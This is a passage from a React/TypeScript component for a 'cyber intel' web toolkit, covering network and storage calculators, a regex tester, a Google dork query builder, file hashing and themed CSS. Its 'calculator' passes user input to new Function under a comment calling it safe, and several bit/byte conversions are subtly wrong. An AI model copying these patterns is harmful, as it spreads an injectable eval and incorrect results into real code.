          const mapped = `::ffff:${hex[0]}${hex[1]}:${hex[2]}${hex[3]}`;
          const compat = `::${hex[0]}${hex[1]}:${hex[2]}${hex[3]}`;
          result = [
            `IPv4: ${raw}`,
            `─────────────────────────────────────────`,
            `IPv4-mapped IPv6:     ${mapped}`,
            `IPv4-compatible IPv6: ${compat}`,
            `Full expanded:        0000:0000:0000:0000:0000:ffff:${oct.slice(0,2).map(n=>n.toString(16).padStart(2,'0')).join('')}:${oct.slice(2).map(n=>n.toString(16).padStart(2,'0')).join('')}`,
          ].join('\n');
          break;
        }

        // ── MAC Lookup ──────────────────────────────────────────────────────
        case 'mac-lookup': {
          const clean = raw.toUpperCase().replace(/[^0-9A-F]/g, '');
          const oui = `${clean.slice(0,2)}:${clean.slice(2,4)}:${clean.slice(4,6)}`;
          const vendor = OUI_MAP[oui] || 'Unknown (not in offline OUI list)';
          result = [
            `MAC Address: ${raw}`,
            `OUI Prefix: ${oui}`,
            `Vendor: ${vendor}`,
            ``,
            `Note: Using offline sample OUI database.`,
            `For full lookup visit: https://macvendors.com`,
          ].join('\n');
          break;
        }

        // ── Ping Calculator ─────────────────────────────────────────────────
        case 'ping-calc': {
          const speedMap: Record<string, { speed: number; label: string }> = {
            fiber:    { speed: 200000, label: 'Fiber (200,000 km/s)' },
            copper:   { speed: 200000, label: 'Copper (200,000 km/s)' },
            wireless: { speed: 300000, label: 'Wireless (300,000 km/s)' },
            satellite:{ speed: 300000, label: 'Satellite GEO (35,786 km altitude)' },
          };
          const medium = Object.keys(speedMap).find(k => raw.toLowerCase().includes(k));
          const dist   = parseFloat(raw) || 1500;
          if (raw.toLowerCase().includes('satellite')) {
            result = [
              `Medium: Satellite (GEO)`,
              `Altitude: ~35,786 km`,
              `Single trip: ~119ms`,
              `Round-trip (RTT): ~238ms (theoretical)`,
              `Realistic RTT: ~600ms (with processing overhead)`,
            ].join('\n');
          } else {
            const info = speedMap[medium || 'fiber'];
            const rtt  = ((dist * 2) / (info?.speed || 200000) * 1000).toFixed(3);
            result = [
              `Distance: ${dist} km`,
              `Medium: ${info?.label || 'Fiber'}`,
              `One-way: ${(parseFloat(rtt) / 2).toFixed(3)} ms`,
              `Round-trip (RTT): ${rtt} ms (theoretical speed-of-light)`,
              `Realistic RTT: ~${(parseFloat(rtt) * 2.5).toFixed(1)} ms (with routing overhead)`,
            ].join('\n');
          }
          break;
        }

        // ── Latency vs Throughput ───────────────────────────────────────────
        case 'latency-calc': {
          const [bwStr, latStr, winStr] = raw.split('::').map(s => s.trim());
          const bwMatch  = bwStr.match(/([\d.]+)\s*(Mbps|Gbps|Kbps)/i);
          const latMatch = latStr.match(/([\d.]+)\s*ms/i);
          const winMatch = winStr.match(/([\d.]+)\s*(bytes|KB|MB)?/i);
          if (!bwMatch || !latMatch) { result = 'Format: 100Mbps::50ms::65535bytes'; break; }
          let bwBps = parseFloat(bwMatch[1]);
          if (bwMatch[2].toLowerCase() === 'gbps') bwBps *= 1000;
          if (bwMatch[2].toLowerCase() === 'kbps') bwBps /= 1000;
          bwBps *= 1_000_000;
          const rtt  = parseFloat(latMatch[1]) / 1000;
          let winBytes = parseFloat(winMatch?.[1] || '65535');
          if (winMatch?.[2]?.toLowerCase() === 'kb') winBytes *= 1024;
          if (winMatch?.[2]?.toLowerCase() === 'mb') winBytes *= 1048576;
          const bwDelay    = bwBps * rtt;
          const effectiveTp = Math.min(bwBps, (winBytes * 8) / rtt);
          const efficiency  = (effectiveTp / bwBps * 100).toFixed(1);
          result = [
            `Bandwidth: ${bwMatch[1]} ${bwMatch[2]}`,
            `RTT: ${latMatch[1]} ms`,
            `Window Size: ${winBytes} bytes`,
            `─────────────────────────────────────────`,
            `BDP (Bandwidth-Delay Product): ${(bwDelay / 8).toFixed(0)} bytes`,
            `Effective Throughput: ${(effectiveTp / 1_000_000).toFixed(2)} Mbps`,
            `Link Efficiency: ${efficiency}%`,
          ].join('\n');
          break;
        }

        // ── Packet Loss ─────────────────────────────────────────────────────
        case 'packet-loss': {
          const [bwStr, lossStr, rttStr] = raw.split('::').map(s => s.trim());
          const bwMatch  = bwStr.match(/([\d.]+)\s*(Mbps|Gbps)/i);
          const loss     = parseFloat(lossStr) / 100;
          const rttMatch = rttStr.match(/([\d.]+)\s*ms/i);
          if (!bwMatch || !rttMatch) { result = 'Format: 100Mbps::2::50ms'; break; }
          let bwMbps = parseFloat(bwMatch[1]);
          if (bwMatch[2].toLowerCase() === 'gbps') bwMbps *= 1000;
          const rtt = parseFloat(rttMatch[1]);
          // Mathis equation
          const mss = 1460;
          const eff = (mss * 8) / (rtt / 1000 * Math.sqrt(loss));
          const effMbps = Math.min(eff / 1_000_000, bwMbps);
          result = [
            `Bandwidth: ${bwMbps} Mbps`,
            `Packet Loss: ${parseFloat(lossStr)}%`,
            `RTT: ${rtt} ms`,
            `─────────────────────────────────────────`,
            `Effective Throughput (Mathis): ${effMbps.toFixed(2)} Mbps`,
            `Degradation: ${((1 - effMbps / bwMbps) * 100).toFixed(1)}%`,
            ``,
            `QoS Impact: ${loss < 0.01 ? 'Negligible' : loss < 0.05 ? 'Noticeable' : loss < 0.1 ? 'Severe' : 'Critical'}`,
          ].join('\n');
          break;
        }

        // ── Bandwidth Calculator ────────────────────────────────────────────
        case 'bw-calc': {
          const convMatch = raw.match(/([\d.]+)\s*(Gbps|Mbps|Kbps|GBps|MBps|KBps)\s*to\s*(Gbps|Mbps|Kbps|GBps|MBps|KBps)/i);
          if (convMatch) {
            const val   = parseFloat(convMatch[1]);
            const from  = convMatch[2];
            const to    = convMatch[3];
            const toBits = (v: number, u: string): number => {
              const m: Record<string, number> = { gbps: 1e9, mbps: 1e6, kbps: 1e3, gbps2: 8e9, mbps2: 8e6, kbps2: 8e3 };
              return v * (m[u.toLowerCase()] || 1);
            };
            const fromBits = toBits(val, from);
            const unit = to.toLowerCase();
            const divMap: Record<string, number> = { gbps: 1e9, mbps: 1e6, kbps: 1e3, gbps2: 8e9, mbps2: 8e6, kbps2: 8e3 };
            const converted = fromBits / (divMap[unit] || 1);
            result = `${val} ${from} = ${converted.toFixed(4)} ${to}`;
          } else {
            const m = raw.match(/([\d.]+)\s*(Gbps|Mbps|Kbps)/i);
            if (!m) { result = 'Enter: 100 Mbps  or  1 Gbps to MBps'; break; }
            const val = parseFloat(m[1]);
            const unit = m[2].toLowerCase();
            let bitsPerSec = val;
            if (unit === 'gbps') bitsPerSec = val * 1e9;
            if (unit === 'mbps') bitsPerSec = val * 1e6;
            if (unit === 'kbps') bitsPerSec = val * 1e3;
            result = [
              `Input: ${val} ${m[2]}`,
              `─────────────────────────────────────────`,
              `Gbps:  ${(bitsPerSec / 1e9).toFixed(4)}`,
              `Mbps:  ${(bitsPerSec / 1e6).toFixed(4)}`,
              `Kbps:  ${(bitsPerSec / 1e3).toFixed(2)}`,
              `bps:   ${bitsPerSec.toFixed(0)}`,
              `GBps:  ${(bitsPerSec / 8e9).toFixed(4)}`,
              `MBps:  ${(bitsPerSec / 8e6).toFixed(4)}`,
              `KBps:  ${(bitsPerSec / 8e3).toFixed(2)}`,
              `Bps:   ${(bitsPerSec / 8).toFixed(0)}`,
            ].join('\n');
          }
          break;
        }

        // ── Bitrate Calculator ──────────────────────────────────────────────
        case 'bitrate-calc': {
          const [w, h, fps, depth] = raw.trim().split(/\s+/).map(Number);
          if (!w || !h || !fps) { result = 'Format: WIDTH HEIGHT FPS BITDEPTH\nExample: 1920 1080 30 8'; break; }
          const bd = depth || 8;
          const raw_bps = w * h * fps * bd * 3;
          result = [
            `Resolution: ${w}×${h}`,
            `FPS: ${fps}`,
            `Bit Depth: ${bd}-bit`,
            `─────────────────────────────────────────`,
            `Raw Bitrate: ${(raw_bps / 1e9).toFixed(3)} Gbps`,
            `Compressed (H.264, ~1/50): ${(raw_bps / 50 / 1e6).toFixed(1)} Mbps`,
            `Compressed (H.265, ~1/100): ${(raw_bps / 100 / 1e6).toFixed(1)} Mbps`,
            `Per-frame size (raw): ${(raw_bps / fps / 8 / 1024 / 1024).toFixed(2)} MB`,
            `Storage per hour (H.264): ${(raw_bps / 50 / 8 / 1e9 * 3600).toFixed(2)} GB`,
          ].join('\n');
          break;
        }

        // ── File Size Estimator ─────────────────────────────────────────────
        case 'file-size': {
          const p = raw.toLowerCase().trim().split(/\s+/);
          const type = p[0];
          if (type === 'video') {
            const dur    = parseFloat(p[1]) || 60;
            const qual   = p[2] || '1080p';
            const brMap: Record<string, number> = { '480p': 1.5, '720p': 5, '1080p': 8, '4k': 25, '8k': 80 };
            const br     = brMap[qual] || 8;
            const sizeMB  = (br * 1e6 * dur * 60) / 8 / 1e6;
            result = `Video (${qual}, ${dur}min): ~${sizeMB.toFixed(0)} MB = ${(sizeMB/1024).toFixed(2)} GB\nBitrate used: ${br} Mbps`;
          } else if (type === 'audio') {
            const dur   = parseFloat(p[1]) || 3;
            const br    = parseFloat(p[2]) || 320;
            const sizeMB = (br * 1000 * dur * 60) / 8 / 1e6;
            result = `Audio (${br}kbps, ${dur}min): ~${sizeMB.toFixed(2)} MB`;
          } else if (type === 'image') {
            const mp   = parseFloat(p[1]) || 24;
            const fmt  = p[2] || 'JPEG';
            const mpx  = mp * 1e6;
            const raw2 = mpx * 3;
            const sizes: Record<string, number> = { raw: raw2, tiff: raw2, jpeg: raw2 / 6, png: raw2 / 2, webp: raw2 / 8 };
            const sz   = sizes[fmt.toLowerCase()] || raw2;
            result = `Image (${mp}MP, ${fmt}): ~${(sz/1e6).toFixed(1)} MB`;
          } else {
            result = 'Examples:\nvideo 60min 1080p\naudio 3min 320kbps\nimage 24MP RAW';
          }
          break;
        }

        // ── Storage Converter ───────────────────────────────────────────────
        case 'storage-conv': {
          const m = raw.match(/([\d.]+)\s*(bits?|bytes?|KB|MB|GB|TB|PB|KiB|MiB|GiB|TiB)/i);
          if (!m) { result = 'Enter: 500 GB  or  1.5 TB'; break; }
          const val = parseFloat(m[1]);
          const unitMap: Record<string, number> = {
            bits: 1/8, bit: 1/8, byte: 1, bytes: 1,
            kb: 1e3, mb: 1e6, gb: 1e9, tb: 1e12, pb: 1e15,
            kib: 1024, mib: 1048576, gib: 1073741824, tib: 1099511627776,
          };
          const bytes = val * (unitMap[m[2].toLowerCase()] || 1);
          result = [
            `Input: ${val} ${m[2]}`,
            `─────────────────────────────────────────`,
            `Bits:  ${(bytes * 8).toFixed(0)}`,
            `Bytes: ${bytes.toFixed(0)}`,
            `KB:    ${(bytes / 1e3).toFixed(4)}`,
            `MB:    ${(bytes / 1e6).toFixed(4)}`,
            `GB:    ${(bytes / 1e9).toFixed(6)}`,
            `TB:    ${(bytes / 1e12).toFixed(9)}`,
            `KiB:   ${(bytes / 1024).toFixed(4)}`,
            `MiB:   ${(bytes / 1048576).toFixed(6)}`,
            `GiB:   ${(bytes / 1073741824).toFixed(8)}`,
          ].join('\n');
          break;
        }

        // ── Transfer Time ───────────────────────────────────────────────────
        case 'transfer-time': {
          const [sizeStr, speedStr] = raw.split('::').map(s => s.trim());
          const sm = sizeStr.match(/([\d.]+)\s*(GB|MB|TB|KB)/i);
          const sp = speedStr.match(/([\d.]+)\s*(Mbps|Gbps|MBps|GBps|KBps)/i);
          if (!sm || !sp) { result = 'Format: 10 GB :: 100 Mbps'; break; }
          const sizeMap: Record<string, number> = { kb: 1e3, mb: 1e6, gb: 1e9, tb: 1e12 };
          const bytes = parseFloat(sm[1]) * (sizeMap[sm[2].toLowerCase()] || 1);
          const speedUnit = sp[2].toLowerCase();
          const realBps = parseFloat(sp[1]) * (speedUnit === 'gbps' ? 1e9/8 : speedUnit === 'mbps' ? 1e6/8 : speedUnit === 'kbps' ? 1e3/8 : speedUnit === 'gbps2' ? 1e9 : speedUnit === 'mbps2' ? 1e6 : 1e3);
          const secs = bytes / realBps;
          const h = Math.floor(secs / 3600), mn = Math.floor((secs % 3600) / 60), s2 = Math.floor(secs % 60);
          result = [
            `File: ${sm[1]} ${sm[2]}  |  Speed: ${sp[1]} ${sp[2]}`,
            `Transfer Time: ${h > 0 ? h + 'h ' : ''}${mn > 0 ? mn + 'm ' : ''}${s2}s`,
          ].join('\n');
          break;
        }

        // ── Download Time ───────────────────────────────────────────────────
        case 'download-time': {
          const [sizeStr, speedStr, overheadStr] = raw.split('::').map(s => s.trim());
          const sm = sizeStr.match(/([\d.]+)\s*(GB|MB|TB|KB)/i);
          const sp = speedStr.match(/([\d.]+)\s*(Mbps|Gbps)/i);
          const overhead = parseFloat(overheadStr) || 15;
          if (!sm || !sp) { result = 'Format: 4.7GB :: 50Mbps :: 15'; break; }
          const sizeBytes = parseFloat(sm[1]) * (sm[2].toLowerCase() === 'gb' ? 1e9 : sm[2].toLowerCase() === 'mb' ? 1e6 : sm[2].toLowerCase() === 'tb' ? 1e12 : 1e3);
          let speedBps = parseFloat(sp[1]) * 1e6 / 8;
          if (sp[2].toLowerCase() === 'gbps') speedBps = parseFloat(sp[1]) * 1e9 / 8;
          const effective = speedBps * (1 - overhead / 100);
          const secs = sizeBytes / effective;
          const h = Math.floor(secs / 3600), mn = Math.floor((secs % 3600) / 60), s2 = Math.floor(secs % 60);
          result = [
            `Download: ${sm[1]} ${sm[2]}`,
            `Speed: ${sp[1]} ${sp[2]} (effective after ${overhead}% overhead: ${(effective * 8 / 1e6).toFixed(1)} Mbps)`,
            `Time: ${h > 0 ? h + 'h ' : ''}${mn > 0 ? mn + 'm ' : ''}${s2}s`,
          ].join('\n');
          break;
        }

        // ── RAID Calculator ─────────────────────────────────────────────────
        case 'raid-calc': {
          const p = raw.trim().toUpperCase().split(/\s+/);
          const level     = p[0]?.replace('RAID', '') || '5';
          const drives    = parseInt(p[1]) || 4;
          const driveMatch = p[2]?.match(/([\d.]+)(TB|GB)/i);
          const driveSz   = parseFloat(driveMatch?.[1] || '2');
          const unit      = driveMatch?.[2]?.toUpperCase() || 'TB';
          const total     = drives * driveSz;
          let usable = 0, fault = 0, note = '';
          if (level === '0')  { usable = total; fault = 0; note = 'Striping - no redundancy'; }
          else if (level === '1') { usable = total / 2; fault = Math.floor(drives / 2); note = 'Mirroring'; }
          else if (level === '5') { usable = (drives - 1) * driveSz; fault = 1; note = 'Distributed parity'; }
          else if (level === '6') { usable = (drives - 2) * driveSz; fault = 2; note = 'Double parity'; }
          else if (level === '10') { usable = total / 2; fault = Math.floor(drives / 2); note = 'Stripe of mirrors'; }
          const eff = ((usable / total) * 100).toFixed(0);
          result = [
            `RAID ${level} | ${drives} drives × ${driveSz} ${unit}`,
            `─────────────────────────────────────────`,
            `Total raw:   ${total} ${unit}`,
            `Usable:      ${usable} ${unit}`,
            `Efficiency:  ${eff}%`,
            `Fault tolerance: ${fault} drive failure${fault !== 1 ? 's' : ''}`,
            `Note: ${note}`,
          ].join('\n');
          break;
        }

        // ── Cloud Cost ──────────────────────────────────────────────────────
        case 'cloud-cost': {
          const lines2 = raw.split('\n').filter(Boolean);
          const rates: Record<string, { price: number; label: string; unit: string }> = {
            compute: { price: 0.048,  label: 'Compute (vCPU/mo)', unit: 'vCPU' },
            storage: { price: 0.023,  label: 'Storage (GB/mo)',   unit: 'GB'   },
            transfer:{ price: 0.09,   label: 'Egress (GB/mo)',    unit: 'GB'   },
            memory:  { price: 0.006,  label: 'Memory (GB/mo)',    unit: 'GB'   },
          };
          let total = 0;
          const items: string[] = [];
          lines2.forEach(line => {
            const parts3 = line.trim().toLowerCase().split(/\s+/);
            const type   = parts3[0];
            const amount = parseFloat(parts3[1]) || 1;
            const rate   = rates[type];
            if (rate) {
              const cost = amount * rate.price * 730;
              total += cost;
              items.push(`  ${rate.label.padEnd(28)} ${amount} ${rate.unit} → $${cost.toFixed(2)}/mo`);
            }
          });
          result = [
            `Cloud Cost Estimate (AWS-like pricing)`,
            `─────────────────────────────────────────`,
            ...items,
            `─────────────────────────────────────────`,
            `Monthly Total: $${total.toFixed(2)}`,
            `Annual Total:  $${(total * 12).toFixed(2)}`,
            ``,
            `Note: Estimates only. Actual pricing varies.`,
          ].join('\n');
          break;
        }

        // ── Uptime Calculator ───────────────────────────────────────────────
        case 'uptime-calc': {
          let pct: number;
          if (raw.match(/^\d+(\.\d+)?$/) && parseFloat(raw) <= 10) {
            pct = 100 - Math.pow(10, -parseFloat(raw));
          } else {
            pct = parseFloat(raw);
          }
          const downPerYear  = (1 - pct / 100) * 365.25 * 24 * 60;
          const downPerMonth = downPerYear / 12;
          const downPerWeek  = downPerYear / 52;
          const downPerDay   = downPerYear / 365.25;
          const fmt = (mins: number) => {
            if (mins < 1)    return `${(mins * 60).toFixed(1)}s`;
            if (mins < 60)   return `${mins.toFixed(2)}min`;
            if (mins < 1440) return `${(mins / 60).toFixed(2)}h`;
            return `${(mins / 1440).toFixed(2)} days`;
          };
          result = [
            `Uptime: ${pct}%`,
            `─────────────────────────────────────────`,
            `Allowed downtime per:`,
            `  Day:   ${fmt(downPerDay)}`,
            `  Week:  ${fmt(downPerWeek)}`,
            `  Month: ${fmt(downPerMonth)}`,
            `  Year:  ${fmt(downPerYear)}`,
          ].join('\n');
          break;
        }

        // ── Calculator ──────────────────────────────────────────────────────
        case 'calculator': {
          // Safe eval via Function
          try {
            // eslint-disable-next-line no-new-func
            const res = new Function(`"use strict"; const {sqrt,pow,log,log2,log10,abs,floor,ceil,round,sin,cos,tan,PI,E,max,min} = Math; return (${raw});`)();
            result = `Expression: ${raw}\nResult: ${res}`;
          } catch {
            result = 'ERROR: Invalid expression';
          }
          break;
        }

        // ── Regex Tester ────────────────────────────────────────────────────
        case 'regex-test': {
          const [pattern, flags, ...testParts] = raw.split('::');
          const testStr = testParts.join('::');
          if (!pattern || !testStr) {
            result = 'Format: PATTERN::FLAGS::TEST_STRING\nExample: \\d+::g::abc 123 def 456';
            break;
          }
          const matches: RegExpExecArray[] = [];
          let rxMatch: RegExpExecArray | null;
          const rxGlobal = new RegExp(pattern, (flags || 'g').includes('g') ? flags || 'g' : (flags || '') + 'g');
          while ((rxMatch = rxGlobal.exec(testStr)) !== null) {
            matches.push(rxMatch);
            if (!rxGlobal.global) break;
          }
          result = [
            `Pattern: /${pattern}/${flags}`,
            `Test string: "${testStr}"`,
            `─────────────────────────────────────────`,
            `Matches (${matches.length}):`,
            ...matches.map((m: RegExpExecArray, i: number) => `  [${i}] "${m[0]}" at index ${m.index}` + (m.length > 1 ? `\n      Groups: ${m.slice(1).map((g: string, gi: number) => `$${gi + 1}="${g}"`).join(', ')}` : '')),
            matches.length === 0 ? '  No matches found.' : '',
          ].join('\n');
          break;
        }

        // ── Google Dork Builder ─────────────────────────────────────────────
        case 'dork-build': {
          const ops = raw.split('\n').map(l => l.trim()).filter(Boolean);
          const dork = ops.join(' ');
          const encoded = encodeURIComponent(dork);
          result = [
            `Built Google Dork Query:`,
            `─────────────────────────────────────────`,
            dork,
            ``,
            `URL (copy to browser):`,
            `https://www.google.com/search?q=${encoded}`,
            ``,
            `Operators used: ${ops.length}`,
          ].join('\n');
          break;
        }

        default:
          result = `// ${selectedTool.name} ready.\n// Output will appear based on input: ${raw}`;
      }

      setOutput(result);
    } catch (err) {
      setOutput(`ERROR: ${err instanceof Error ? err.message : 'Invalid input for this operation.'}`);
    }
  };

  // ─── File Hash Handler ──────────────────────────────────────────────────────
  const handleFileChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    setFileOutput('Hashing...');

    const buffer = await file.arrayBuffer();
    const encode = (buf: ArrayBuffer) =>
      Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');

    const [sha256, sha1] = await Promise.all([
      crypto.subtle.digest('SHA-256', buffer),
      crypto.subtle.digest('SHA-1', buffer),
    ]);

    setFileOutput([
      `File: ${file.name}`,
      `Size: ${(file.size / 1024).toFixed(2)} KB`,
      `Type: ${file.type || 'unknown'}`,
      `─────────────────────────────────────────`,
      `SHA-256: ${encode(sha256)}`,
      `SHA-1:   ${encode(sha1)}`,
    ].join('\n'));
  };

  // ─── EXIF Viewer Handler ────────────────────────────────────────────────────
  const handleExifFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (!file) return;
    const info: string[] = [
      `File: ${file.name}`,
      `Size: ${(file.size / 1024).toFixed(2)} KB`,
      `Type: ${file.type}`,
      `Last Modified: ${new Date(file.lastModified).toISOString()}`,
      `─────────────────────────────────────────`,
    ];
    // Basic EXIF from JPEG
    if (file.type === 'image/jpeg') {
      const buf = await file.arrayBuffer();
      const view = new DataView(buf);
      const exifStart = (() => {
        for (let i = 0; i < Math.min(buf.byteLength - 2, 65536); i++) {
          if (view.getUint16(i) === 0xFFE1) return i + 4;
        }
        return -1;
      })();
      if (exifStart > 0) {
        info.push('EXIF data found.');
        info.push('Full EXIF parsing requires exif-js library.');
        info.push('Install: npm install exif-js');
      } else {
        info.push('No EXIF segment found in this JPEG.');
      }
    }
    const img = new Image();
    const url = URL.createObjectURL(file);
    img.onload = () => {
      info.push(`Dimensions: ${img.naturalWidth} × ${img.naturalHeight} px`);
      setFileOutput(info.join('\n'));
      URL.revokeObjectURL(url);
    };
    img.src = url;
    setFileOutput(info.join('\n'));
  };

  const needsFileInput = ['file-hash', 'exif-view'].includes(selectedTool?.id || '');
  const [activeTab, setActiveTab] = useState<'featured' | 'all'>('all');
  const matrixRef = useRef<HTMLCanvasElement>(null);
  const [scrollY, setScrollY] = useState(0);

  // Track scroll for matrix transparency
  useEffect(() => {
    const onScroll = () => setScrollY(window.scrollY);
    window.addEventListener('scroll', onScroll, { passive: true });
    return () => window.removeEventListener('scroll', onScroll);
  }, []);

  // ─── Matrix Rain Canvas ─────────────────────────────────────────────────────
  useEffect(() => {
    const canvas = matrixRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    const resize = () => {
      canvas.width  = window.innerWidth;
      canvas.height = window.innerHeight;
    };
    resize();
    window.addEventListener('resize', resize);

    const chars = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン01234567890ABCDEF<>/{}[]|\\!@#$%^&*';
    const fontSize = 13;
    let cols = Math.floor(window.innerWidth / fontSize);
    const drops: number[] = Array(cols).fill(1);

    const draw = () => {
      ctx.fillStyle = 'rgba(0,0,0,0.06)';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      cols = Math.floor(canvas.width / fontSize);
      while (drops.length < cols) drops.push(Math.random() * -100);

      for (let i = 0; i < cols; i++) {
        const char = chars[Math.floor(Math.random() * chars.length)];
        const brightness = Math.random();
        if (brightness > 0.97) {
          ctx.fillStyle = 'rgba(200,210,215,0.9)';   // rare bright white-gray
        } else if (brightness > 0.85) {
          ctx.fillStyle = 'rgba(130,150,160,0.65)';  // medium gray
        } else if (brightness > 0.55) {
          ctx.fillStyle = 'rgba(80,95,105,0.45)';    // dim gray
        } else {
          ctx.fillStyle = 'rgba(40,50,55,0.3)';      // near-invisible dark
        }
        ctx.font = `${fontSize}px monospace`;
        ctx.fillText(char, i * fontSize, drops[i] * fontSize);
        if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
        drops[i]++;
      }
    };

    const interval = setInterval(draw, 45);
    return () => { clearInterval(interval); window.removeEventListener('resize', resize); };
  }, []);

  // ─── Render ─────────────────────────────────────────────────────────────────
  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap');
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        /* ── CATEGORY COLOR PALETTE ── */
        :root {
          --cat-security:  #00ffff;
          --cat-password:  #ff6b6b;
          --cat-encoding:  #a78bfa;
          --cat-forensics: #34d399;
          --cat-network:   #fbbf24;
          --cat-storage:   #60a5fa;
          --cat-utility:   #f472b6;
          --cyan: #00ffff;
          --cyan-dim: rgba(0,255,255,0.15);
          --cyan-glow: rgba(0,255,255,0.08);
        }

        /* ── ROOT ── */
        html, body { margin: 0; padding: 0; background: #000; overflow-x: hidden; }

        .tk-root {
          min-height: 100vh;
          background: transparent;
          color: #c0d8e0;
          font-family: 'Share Tech Mono', monospace;
          position: relative;
          overflow-x: hidden;
        }

        /* Matrix canvas - full visible, opacity driven by JS */
        .tk-matrix-canvas {
          position: fixed;
          top: 0; left: 0;
          width: 100%; height: 100%;
          z-index: 0;
          pointer-events: none;
          transition: opacity 0.8s ease;
        }

        /* Dark overlay over matrix for readability - stronger in card zones */
        .tk-vignette {
          position: fixed;
          inset: 0;
          background: rgba(0,0,0,0.35);
          z-index: 1;
          pointer-events: none;
          transition: background 0.8s ease;
        }
        .tk-vignette.dimmed {
          background: rgba(0,0,0,0.72);
        }

        /* ── ANIMATIONS ── */
        @keyframes fadeSlideUp {
          from { opacity: 0; transform: translateY(24px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        @keyframes fadeIn {
          from { opacity: 0; } to { opacity: 1; }
        }
        @keyframes glowPulse {
          0%,100% { box-shadow: 0 0 8px var(--cyan), 0 0 20px rgba(0,255,255,0.2); }
          50%      { box-shadow: 0 0 16px var(--cyan), 0 0 40px rgba(0,255,255,0.35); }
        }
        @keyframes borderFlow {
          0%   { border-color: rgba(0,255,255,0.2); }
          50%  { border-color: rgba(0,255,255,0.55); }
          100% { border-color: rgba(0,255,255,0.2); }
        }
        @keyframes scanline {
          0%   { transform: translateY(-100%); }
          100% { transform: translateY(100vh); }
        }
        @keyframes dotBlink {
          0%,100% { opacity:1; } 50% { opacity:0.2; }
        }
        @keyframes countUp {
          from { opacity: 0; transform: scale(0.7); }
          to   { opacity: 1; transform: scale(1); }
        }
        @keyframes cardIn {
          from { opacity: 0; transform: translateY(16px) scale(0.97); }
          to   { opacity: 1; transform: translateY(0) scale(1); }
        }
        @keyframes shimmer {
          0%   { background-position: -200% center; }
          100% { background-position: 200% center; }
        }
        @keyframes rotateIcon {
          from { transform: rotate(0deg); }
          to   { transform: rotate(360deg); }
        }

        /* ── SCANLINE EFFECT ── */
        .tk-scanline {
          position: fixed;
          top: 0; left: 0; right: 0;
          height: 2px;
          background: linear-gradient(90deg, transparent, rgba(0,255,255,0.3), transparent);
          z-index: 2;
          animation: scanline 8s linear infinite;
          pointer-events: none;
        }

        /* ── NAV ── */
        .tk-nav {
          position: sticky;
          top: 0;
          z-index: 10;
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 1rem 2rem;
          background: rgba(0,0,0,0.7);
          backdrop-filter: blur(16px);
          border-bottom: 1px solid rgba(0,255,255,0.15);
          animation: fadeIn 0.5s ease both;
        }
        .tk-nav-brand {
          font-family: 'Orbitron', monospace;
          font-size: 0.9rem;
          font-weight: 900;
          letter-spacing: 0.3em;
          background: linear-gradient(90deg, #00ffff, #a78bfa, #00ffff);
          background-size: 200% auto;
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          animation: shimmer 4s linear infinite;
        }
        .tk-nav-right { display: flex; align-items: center; gap: 0.75rem; }
        .tk-nav-back {
          background: rgba(0,255,255,0.06);
          border: 1px solid rgba(0,255,255,0.3);
          color: rgba(0,255,255,0.8);
          padding: 0.35rem 1rem;
          font-family: 'Share Tech Mono', monospace;
          font-size: 0.72rem;
          cursor: pointer;
          letter-spacing: 0.08em;
          transition: all 0.2s;
        }
        .tk-nav-back:hover { background: rgba(0,255,255,0.15); color: #00ffff; box-shadow: 0 0 12px rgba(0,255,255,0.2); }
        .tk-nav-dot {
          width: 8px; height: 8px;
          background: #00ffff;
          border-radius: 50%;
          box-shadow: 0 0 10px #00ffff;
          animation: dotBlink 2s infinite;
        }

        /* ── INNER ── */
        .tk-inner {
          position: relative;
          z-index: 5;
          padding: 0 2rem 5rem;
          max-width: 1440px;
          margin: 0 auto;
        }

        /* ── HERO ── */
        .tk-hero {
          padding: 3rem 0 2rem;
          animation: fadeSlideUp 0.7s ease 0.1s both;
        }
        .tk-hero-status {
          display: inline-flex;
          align-items: center;
          gap: 0.5rem;
          border: 1px solid rgba(0,255,255,0.3);
          padding: 0.3rem 0.9rem;
          font-size: 0.68rem;
          color: #00ffff;
          letter-spacing: 0.18em;
          text-transform: uppercase;
          margin-bottom: 1.5rem;
          background: rgba(0,255,255,0.05);
          backdrop-filter: blur(8px);
        }
        .tk-status-dot {
          width: 6px; height: 6px;
          background: #00ffff;
          border-radius: 50%;
          box-shadow: 0 0 8px #00ffff;
          animation: dotBlink 1.5s infinite;
        }
        .tk-hero-cyber {
          font-family: 'Orbitron', monospace;
          font-size: clamp(3.5rem, 9vw, 7rem);
          font-weight: 900;
          color: #00ffff;
          display: block;
          line-height: 0.88;
          text-shadow: 0 0 30px rgba(0,255,255,0.6), 0 0 80px rgba(0,255,255,0.25);
          letter-spacing: -0.02em;
        }
        .tk-hero-intel {
          font-family: 'Orbitron', monospace;
          font-size: clamp(2.8rem, 7.5vw, 6rem);
          font-weight: 900;
          color: rgba(255,255,255,0.92);
          display: block;
          line-height: 0.95;
          letter-spacing: -0.02em;
        }
        .tk-hero-version {
          font-family: 'Orbitron', monospace;
          font-size: clamp(1.5rem, 4vw, 3.2rem);
          font-weight: 700;
          color: #00ffff;
          display: block;
          margin-top: 0.5rem;
          letter-spacing: 0.04em;
          text-shadow: 0 0 20px rgba(0,255,255,0.4);
        }
        .tk-hero-desc {
          font-size: 0.88rem;
          color: rgba(180,210,220,0.7);
          margin-top: 1.25rem;
          max-width: 520px;
          line-height: 1.75;
        }

        /* ── STAT CARDS ── */
        .tk-stats-row {
          display: flex;
          gap: 1rem;
          margin-top: 2rem;
          flex-wrap: wrap;
        }
        .tk-stat-card {
          position: relative;
          background: rgba(0,0,0,0.45);
          backdrop-filter: blur(12px);
